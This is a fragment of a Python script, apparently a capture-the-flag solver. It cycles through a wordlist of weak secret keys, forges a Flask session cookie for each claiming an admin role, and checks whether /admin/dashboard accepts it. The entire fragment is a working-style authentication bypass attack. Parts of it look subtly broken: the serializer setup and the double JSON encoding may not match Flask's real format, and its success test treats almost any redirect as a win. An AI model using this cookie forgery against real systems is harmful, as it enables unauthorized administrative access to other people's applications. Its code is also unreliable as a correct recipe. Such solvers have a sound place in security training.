    'secret', 'SECRET', 'Secret', 'secretkey', 'secret-key', 'supersecret', 'supersecretkey',
    'development', 'dev', 'devkey', 'debug', 'flask', 'flask_secret_key', 'password',
    'admin', 'admin123', 'changeme', 'default', '123456', 'letmein', 'password123',
    'thisisasecret', 'this_is_a_secret', 'verysecret', 'topsecret', 'ultrasecret',
]

success = None
headers = {"User-Agent": "ctf-client"}

def make_cookie(secret_key, data):
    s = itsdangerous.URLSafeTimedSerializer(
        secret_key,
        salt='cookie-session',
        serializer=itsdangerous.serializer.Serializer(),
        signer_kwargs={'key_derivation': 'hmac', 'digest_method': __import__('hashlib').sha1}
    )
    # Flask uses TaggedJSONSerializer, but plain JSON for simple structures is compatible
    # To be safer, use JSON dumps and wrap as string
    payload = json.dumps(data, separators=(',', ':'))
    return s.dumps(payload)

for sk in candidates:
    try:
        cookie_val = make_cookie(sk, {"role": "admin", "username": "admin"})
    except Exception as e:
        continue
    try:
        r = requests.get(base + '/admin/dashboard', headers={'Cookie': f'session={cookie_val}'}, allow_redirects=False, timeout=3)
        if r.status_code == 200 and b'Admin' in r.content or r.headers.get('Location','') != '/admin/login':
            success = (sk, cookie_val, r.status_code, r.headers.get('Location',''), r.text[:200])
            break
    except Exception as e:
        pass

